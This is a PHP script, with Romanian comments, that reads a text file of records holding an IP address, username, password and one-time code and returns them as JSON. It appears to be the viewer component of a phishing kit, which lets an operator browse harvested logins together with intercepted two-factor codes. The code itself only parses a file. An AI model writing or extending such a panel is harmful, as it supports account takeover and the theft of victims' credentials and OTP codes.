<?php
header('Content-Type: application/json');
$file_path = '../../result.txt';
$file_lines = file($file_path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

if ($file_lines !== false) {
    $result = []; // Initializează array-ul înainte de bucla foreach
    foreach ($file_lines as $line) {
        $line_parts = explode('|', $line);
        $line_parts = array_map('trim', $line_parts);
        if (isset($line_parts[0])) {
            $ip = str_replace('IP: ', '', $line_parts[0]);
        }else{
            $ip = '';
        }
        if (isset($line_parts[1])) {
             $USER = str_replace('USER: ', '', $line_parts[1]);
        }else{
            $USER = '';
        }
       
        if (isset($line_parts[2])) {
            $PASS = str_replace('PASS: ', '', $line_parts[2]);
        }else{
            $PASS = '';
        }
        if (isset($line_parts[3])) {
            $OTP = str_replace('COD: ', '', $line_parts[3]);
            $OTPs= str_replace('[', '', $OTP);
            $COD= str_replace(']', '', $OTPs);
        }else{
            $COD = '';
        }

        $line_data = [
            'ip' => $ip,
            'user' => $USER,
            'pass' => $PASS,
            'cod' => $COD,
            
        ];
        $result[] = $line_data;
    }
    $jsonData = json_encode($result);
    echo $jsonData;
} else {
    echo 'Eroare la citirea fișierului.';
}
?>
